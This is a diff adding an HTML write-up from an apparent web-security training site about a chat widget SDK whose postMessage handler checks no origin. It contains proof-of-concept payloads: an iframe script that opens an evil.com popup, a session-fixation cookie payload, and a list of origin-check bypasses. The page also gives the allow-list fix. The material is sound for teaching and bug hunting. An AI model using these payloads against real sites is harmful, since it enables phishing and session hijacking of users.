@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PostMessage Without Origin Check - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/postmessage/level1.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">PostMessage &middot; Widget &middot; Open Redirect</span>
+    </div>
+
+    <h1>PostMessage Without Origin Check in Chat Widget SDK</h1>
+    <div class="writeup-author">Inspired by <strong>renwa</strong>'s postMessage exploitation research &middot; Affects all sites using the widget</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>An open-source chat widget SDK registers a global <code>window.onmessage</code> handler that processes <strong>any message</strong> starting with a specific prefix. There is <strong>zero origin validation</strong>. The handler dispatches to internal event handlers that can open arbitrary URLs via <code>window.open()</code>, set authentication cookies, and fire custom events on the host page.</p>
+    </div>
+
+    <h2>The Discovery</h2>
+    <p>The researcher downloaded the chat widget SDK (29KB) and immediately searched for postMessage handlers:</p>
+
+    <pre><code>grep -n 'addEventListener.*message\|onmessage' sdk.js
+
+Line 1004: window.onmessage = e => {</code></pre>
+
+    <p>The handler code had no origin check at all:</p>
+
+    <pre><code>window.onmessage = e => {
+  // Only checks the message prefix - NOT the origin!
+  if (typeof e.data != "string" ||
+      e.data.indexOf("chatwoot-widget:") !== 0) return;
+
+  const o = JSON.parse(
+    e.data.replace("chatwoot-widget:", "")
+  );
+
+  // Dispatches to event handlers based on 'event' field
+  typeof g.events[o.event] == "function"
+    && g.events[o.event](o);
+}</code></pre>
+
+    <p>The researcher then enumerated all dispatchable events:</p>
+
+    <pre><code>// Exploitable events found:
+events = {
+  popoutChatWindow: ({baseUrl, websiteToken, locale}) => {
+    window.open(baseUrl + "/widget?..."); // OPEN REDIRECT!
+  },
+  setAuthCookie: ({data: {widgetAuthToken}}) => {
+    document.cookie = "cw_conversation=" + token; // COOKIE POISONING!
+  },
+  loaded: ({config: {authToken}}) => {
+    // Sets auth cookie + reconfigures entire widget
+  },
+  onEvent: ({eventIdentifier, data}) => {
+    // Fires ARBITRARY custom events on the host page
+  },
+  toggleBubble: () => { /* UI manipulation */ },
+  setBubbleLabel: ({label}) => { /* Changes button text */ }
+}</code></pre>
+
+    <h2>Exploitation Vectors</h2>
+
+    <h3>1. Open Redirect via window.open()</h3>
+    <p>The <code>popoutChatWindow</code> event calls <code>window.open()</code> with an attacker-controlled <code>baseUrl</code>. If the victim's page has the widget and can be framed (no X-Frame-Options), any page can trigger this:</p>
+
+    <pre><code>&lt;iframe src="https://target-with-chatwoot.com" id="target"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+document.getElementById('target').onload = function() {
+  this.contentWindow.postMessage(
+    'chatwoot-widget:' + JSON.stringify({
+      event: "popoutChatWindow",
+      baseUrl: "https://evil.com",
+      websiteToken: "x",
+      locale: "en"
+    }),
+    '*'
+  );
+};
+// Result: victim sees a popup from evil.com
+// that looks like a legitimate chat window
+&lt;/script&gt;</code></pre>
+
+    <h3>2. Session Fixation via Cookie Poisoning</h3>
+    <p>The <code>setAuthCookie</code> event sets the conversation cookie to any value the attacker provides. This enables chat session fixation &mdash; the attacker can make the victim join a conversation they control:</p>
+
+    <pre><code>// From attacker's page or injected script:
+window.postMessage(
+  'chatwoot-widget:' + JSON.stringify({
+    event: "setAuthCookie",
+    data: { widgetAuthToken: "attacker-controlled-token" }
+  }),
+  '*'
+);
+// Victim's chat session is now fixated to attacker's token</code></pre>
+
+    <h3>3. Wildcard postMessage Response (Data Leak)</h3>
+    <p>The SDK also sends messages with <code>targetOrigin: "*"</code>:</p>
+
+    <pre><code>sendMessage: (e, o) => {
+  g.getAppFrame().contentWindow.postMessage(
+    `chatwoot-widget:${JSON.stringify({event: e, ...o})}`,
+    "*"  // ANY origin can receive this!
+  );
+}</code></pre>
+
+    <p>This means if you can frame the widget iframe, you can intercept outgoing messages that may contain conversation data.</p>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>This SDK is open-source and widely deployed. Every site using it is vulnerable to open redirect (phishing via trusted domain), cookie manipulation, and event injection. The attack only requires the target page to be frameable OR for the attacker to have any script execution context on the same page (browser extension, another XSS, etc.).</p>
+    </div>
+
+    <h2>Origin Bypass Techniques</h2>
+    <p>Even when developers do check the origin, common patterns are bypassable:</p>
+
+    <pre><code>// BYPASS 1: indexOf
+if (e.origin.indexOf("target.com") !== -1) { ... }
+// Attack: use origin "target.com.evil.com"
+
+// BYPASS 2: endsWith
+if (e.origin.endsWith("target.com")) { ... }
+// Attack: use origin "eviltarget.com"
+
+// BYPASS 3: startsWith
+if (e.origin.startsWith("https://target")) { ... }
+// Attack: use origin "https://target.evil.com"
+
+// BYPASS 4: Regex without anchors
+if (/.*\.target\.com/.test(e.origin)) { ... }
+// Attack: "evil-target.com" (dot matches any char)
+
+// BYPASS 5: null origin
+if (e.origin === "null" || e.origin === expected) { ... }
+// Attack: sandboxed iframe sends origin "null"
+
+// CORRECT:
+const ALLOWED = ["https://app.target.com", "https://widget.target.com"];
+if (!ALLOWED.includes(e.origin)) return;</code></pre>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When you find a postMessage listener, check three things: (1) Is there an origin check? If not, instant win. (2) If there is a check, what method is used? indexOf/endsWith/startsWith are all bypassable. (3) What does the handler <strong>do</strong> with the data? Look for innerHTML, eval, location changes, cookie setting, fetch URL construction. The sink determines the severity. A postMessage to innerHTML is HIGH. A postMessage to eval is CRITICAL. A postMessage to height/width is LOW.</p>
+    </div>
+
+    <div class="attack-flow">
+      <h4>PostMessage Attack Patterns</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p><strong>postMessage &rarr; innerHTML</strong> = DOM XSS (inject HTML/JS)</p></div>
+      <div class="flow-step"><div class="flow-num">2</div><p><strong>postMessage &rarr; eval/Function</strong> = Direct code execution</p></div>
+      <div class="flow-step"><div class="flow-num">3</div><p><strong>postMessage &rarr; location/href</strong> = Open redirect, javascript: XSS</p></div>
+      <div class="flow-step"><div class="flow-num">4</div><p><strong>postMessage &rarr; fetch URL</strong> = CSPT, SSRF</p></div>
+      <div class="flow-step"><div class="flow-num">5</div><p><strong>postMessage &rarr; document.cookie</strong> = Session fixation</p></div>
+      <div class="flow-step"><div class="flow-num">6</div><p><strong>postMessage &rarr; wildcard response</strong> = Data exfiltration</p></div>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: PostMessage #1 (No Origin Check) &mdash; send malicious postMessage to trigger XSS via innerHTML sink.</p>
+      </div>
+      <a href="/labs/postmessage/level1.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Advanced: Origin Bypass</h4>
+        <p>Lab: PostMessage #2 (indexOf Bypass) &mdash; bypass weak origin validation to inject content.</p>
+      </div>
+      <a href="/labs/postmessage/level2.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/cors-wildcard-credential-theft">&larr; CORS Wildcard Credential Theft</a>
+      <a href="/writeups/prototype-pollution-xss-chain">Prototype Pollution to XSS &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
